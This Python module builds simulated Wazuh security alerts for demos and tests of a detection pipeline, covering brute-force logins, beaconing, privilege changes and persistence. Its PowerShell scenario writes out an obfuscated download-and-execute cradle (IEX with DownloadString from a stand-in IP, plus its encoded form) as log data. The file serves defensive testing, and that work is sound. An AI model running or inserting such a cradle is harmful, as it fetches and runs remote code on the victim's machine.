"""Simulated Wazuh alerts modeling five attacker behaviors.

The payloads deliberately mirror Wazuh's document structure (rule / agent / data /
full_log) so the same normalization path is exercised in demos and tests.
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

SIM_HOSTS = {
    "workstation": "WKS-FIN-02",
    "engineering": "WKS-ENG-04",
    "server": "SRV-DC-01",
    "database": "LINUX-DB-03",
}


def _ts(minutes_ago: float, now: datetime | None = None) -> str:
    base = now or datetime.now(UTC)
    return (base - timedelta(minutes=minutes_ago)).astimezone(UTC).isoformat().replace("+00:00", "Z")


def _agent(host: str) -> dict:
    return {"id": "001", "name": host, "ip": "10.10.20.11"}


def _alert(
    *,
    uid: str,
    minutes_ago: float,
    rule_id: str,
    level: int,
    description: str,
    host: str,
    full_log: str = "",
    src_ip: str | None = None,
    dst_ip: str | None = None,
    username: str | None = None,
    groups: list[str] | None = None,
    data_extra: dict | None = None,
    now: datetime | None = None,
) -> dict:
    data: dict = {}
    if src_ip:
        data["srcip"] = src_ip
    if dst_ip:
        data["dstip"] = dst_ip
    if username:
        data["dstuser"] = username
    if data_extra:
        data.update(data_extra)
    return {
        "id": uid,
        "timestamp": _ts(minutes_ago, now),
        "rule": {"id": rule_id, "level": level, "description": description, "groups": groups or []},
        "agent": _agent(host),
        "data": data,
        "full_log": full_log,
    }


def failed_logins(now: datetime | None = None) -> list[dict]:
    """Brute force / password spraying against a finance workstation."""
    host = SIM_HOSTS["workstation"]
    users = ["j.smith", "j.smith", "j.smith", "a.chen", "j.smith", "admin", "a.chen", "j.smith"]
    alerts = []
    for index, user in enumerate(users):
        alerts.append(
            _alert(
                uid=f"sim-brute-{index}",
                minutes_ago=52 - index,
                rule_id="60122",
                level=10 if index >= 5 else 5,
                description=f"Windows logon failure (4625) for account {user}",
                host=host,
                src_ip="203.0.113.45",
                username=user,
                groups=["windows", "authentication_failures", "sysmon"],
                full_log=(
                    f"EventID: 4625 Logon failure: unknown user name or bad password. "
                    f"TargetUserName: {user} IpAddress: 203.0.113.45 WorkstationName: KALI-ATTACK"
                ),
            )
        )
    return alerts


def suspicious_powershell(now: datetime | None = None) -> list[dict]:
    """Obfuscated PowerShell download cradle on an engineering workstation."""
    host = SIM_HOSTS["engineering"]
    encoded = (
        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8A"
        "dwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcA"
        "NwAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
    )
    command = f"powershell.exe -nop -w hidden -EncodedCommand {encoded}"
    return [
        _alert(
            uid="sim-powershell-0",
            minutes_ago=40,
            rule_id="61603",
            level=12,
            description="PowerShell script block logging detected suspicious pattern",
            host=host,
            username="e.nguyen",
            src_ip=None,
            groups=["windows", "powershell", "sysmon"],
            full_log="ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/payload.ps1')",
            data_extra={
                "win": {
                    "system": {"computer": host, "eventID": "4104"},
                    "eventdata": {
                        "commandLine": command,
                        "targetUserName": "e.nguyen",
                        "scriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/payload.ps1')",
                    },
                }
            },
        ),
        _alert(
            uid="sim-powershell-1",
            minutes_ago=39,
            rule_id="61612",
            level=10,
            description="PowerShell execution policy bypass and hidden window",
            host=host,
            username="e.nguyen",
            groups=["windows", "powershell"],
            full_log=command,
            data_extra={
                "win": {
                    "system": {"computer": host, "eventID": "4688"},
                    "eventdata": {"commandLine": command, "parentImage": "C:\\Windows\\explorer.exe"},
                }
            },
        ),
    ]


def beaconing_network(now: datetime | None = None) -> list[dict]:
    """Regular outbound callbacks from a domain controller to a suspicious IP."""
    host = SIM_HOSTS["server"]
    alerts = []
    for index, minutes in enumerate((30, 29, 28, 27)):
        alerts.append(
            _alert(
                uid=f"sim-network-{index}",
                minutes_ago=minutes,
                rule_id="100201",
                level=10,
                description="Outbound connection to known malicious infrastructure",
                host=host,
                dst_ip="198.51.100.77",
                groups=["firewall", "network", "threat_intel"],
                full_log=(
                    f"TCP connection 10.10.20.31:498{index}2 -> 198.51.100.77:4444 established "
                    f"(bytes_out=2048, bytes_in=512)"
                ),
            )
        )
    return alerts


def privilege_change(now: datetime | None = None) -> list[dict]:
    """Service account added to sudo and a new account created on a database host."""
    host = SIM_HOSTS["database"]
    return [
        _alert(
            uid="sim-privilege-0",
            minutes_ago=20,
            rule_id="100210",
            level=10,
            description="User added to privileged group (sudo) outside change window",
            host=host,
            username="svc-backup",
            src_ip="10.10.20.44",
            groups=["linux", "privilege_change", "auditd"],
            full_log="usermod -aG sudo svc-backup executed by uid=1001 (deploy) from 10.10.20.44",
        ),
        _alert(
            uid="sim-privilege-1",
            minutes_ago=18,
            rule_id="100211",
            level=8,
            description="New user account created on production database host",
            host=host,
            username="svc-ops",
            src_ip="10.10.20.44",
            groups=["linux", "account_management"],
            full_log="useradd -m -s /bin/bash svc-ops",
        ),
    ]


def file_integrity(now: datetime | None = None) -> list[dict]:
    """Persistence via Startup folder plus a modified system binary."""
    host = SIM_HOSTS["engineering"]
    return [
        _alert(
            uid="sim-file-0",
            minutes_ago=15,
            rule_id="100220",
            level=12,
            description="Autorun entry created in Startup folder",
            host=host,
            username="e.nguyen",
            groups=["windows", "syscheck", "persistence"],
            full_log=(
                "File added: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.lnk"
            ),
        ),
        _alert(
            uid="sim-file-1",
            minutes_ago=12,
            rule_id="550",
            level=7,
            description="File integrity checksum changed for system binary",
            host=host,
            groups=["ossec", "syscheck"],
            full_log="Integrity checksum changed: C:\\Windows\\System32\\netprofm.dll",
        ),
    ]


SCENARIOS = {
    "failed_logins": failed_logins,
    "suspicious_powershell": suspicious_powershell,
    "beaconing_network": beaconing_network,
    "privilege_change": privilege_change,
    "file_integrity": file_integrity,
}


def build_all(now: datetime | None = None) -> dict[str, list[dict]]:
    return {name: builder(now) for name, builder in SCENARIOS.items()}


def all_alerts(now: datetime | None = None) -> list[dict]:
    alerts: list[dict] = []
    for events in build_all(now).values():
        alerts.extend(events)
    return alerts
